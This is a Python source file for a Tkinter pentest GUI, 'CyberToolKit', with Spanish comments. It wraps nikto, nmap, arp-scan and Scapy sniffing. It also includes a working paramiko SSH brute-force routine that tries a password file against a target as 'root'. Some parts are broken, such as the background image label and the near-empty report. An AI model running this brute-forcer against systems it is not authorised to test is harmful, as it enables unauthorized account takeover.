import os
import nmap
import paramiko
from scapy.all import  sniff
import subprocess
import tkinter as tk
from tkinter import filedialog
from PIL import Image, ImageTk

# Función para análisis de malware
def analizar_malware(file_path):
    try:
        subprocess.run(['malware-analysis-tool', file_path])
    except Exception as e:
        print(f"Error en analizar_malware: {e}")

# Función para escanear vulnerabilidades web
def escanear_vulnerabilidades_web(target):
    try:
        subprocess.run(['nikto', '-h', target])
    except Exception as e:
        print(f"Error en escanear_vulnerabilidades_web: {e}")

# Función para análisis de red
def analizar_red():
    try:
        subprocess.run(['nmap', '-sn', '192.168.0.1/24'])
    except Exception as e:
        print(f"Error en analizar_red: {e}")

# Función para fuerza bruta de SSH
def fuerza_bruta_ssh(target, username, password_file):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        with open(password_file, 'r') as file:
            for password in file:
                password = password.strip()
                try:
                    ssh.connect(target, username=username, password=password)
                    print(f'[+] Password found: {password}')
                    return
                except paramiko.AuthenticationException:
                    print(f'[-] Incorrect password: {password}')
        print('[-] Password not found')
    except Exception as e:
        print(f"Error en fuerza_bruta_ssh: {e}")

# Función para capturar y analizar tráfico con Scapy
def capturar_trafico(interface):
    try:
        packets = sniff(iface=interface, count=10)
        packets.show()
    except Exception as e:
        print(f"Error en capturar_trafico: {e}")

# Función para escanear red y detectar dispositivos
def escanear_red():
    try:
        subprocess.run(['arp-scan', '-l'])
    except Exception as e:
        print(f"Error en escanear_red: {e}")

# Función para generar informe
def generar_informe():
    try:
        with open('informe.txt', 'w') as file:
            file.write("Informe de CyberToolKit\n")
            file.write("===================================\n")
    except Exception as e:
        print(f"Error en generar_informe: {e}")

# Interfaz gráfica
root = tk.Tk()
root.title("CyberToolKit")
root.geometry("800x600")

# Imagen de fondo
try:
    background_image = Image.open("background.jpg.JPG")
    background_image = ImageTk.PhotoImage(background_image)
    background_label = tk.Label(root, image="background.jpg.JPG")
    background_label.place(relwidth=1, relheight=1)
except Exception as e:
    print(f"Error al cargar la imagen de fondo: {e}")

# Botones y entradas
tk.Label(root, text="Target:").pack()
target_entry = tk.Entry(root)
target_entry.pack()

tk.Button(root, text="Análisis de Malware", command=lambda: analizar_malware(target_entry.get())).pack()
tk.Button(root, text="Escanear Vulnerabilidades Web", command=lambda: escanear_vulnerabilidades_web(target_entry.get())).pack()
tk.Button(root, text="Análisis de Red", command=analizar_red).pack()
tk.Button(root, text="Fuerza Bruta SSH", command=lambda: fuerza_bruta_ssh(target_entry.get(), "root", "passwords.txt")).pack()
tk.Button(root, text="Capturar Tráfico", command=lambda: capturar_trafico("eth0")).pack()
tk.Button(root, text="Escanear Red", command=escanear_red).pack()
tk.Button(root, text="Generar Informe", command=generar_informe).pack()

root.mainloop()

